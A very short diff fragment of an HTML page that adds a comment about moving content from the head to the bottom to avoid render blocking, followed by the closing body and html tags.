+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
